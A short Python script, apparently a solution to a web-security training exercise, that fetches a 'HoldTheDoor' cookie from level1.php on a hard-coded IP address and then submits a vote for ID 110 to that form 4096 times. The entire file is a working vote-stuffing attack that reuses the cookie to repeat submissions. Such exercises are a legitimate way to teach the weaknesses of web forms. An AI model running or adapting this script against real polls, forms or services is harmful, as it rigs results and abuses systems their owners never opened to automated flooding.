#!/usr/bin/python3

import requests

ID = 110
URL = "http://158.69.76.135/level1.php"
r = requests.post(URL)
key = r.cookies['HoldTheDoor']
payload = {
    'id': ID,
    'holdthedoor': 'Submit',
    'key': key
}
for i in range(4096):
    requests.post(URL, data=payload, cookies={"HoldTheDoor": key})
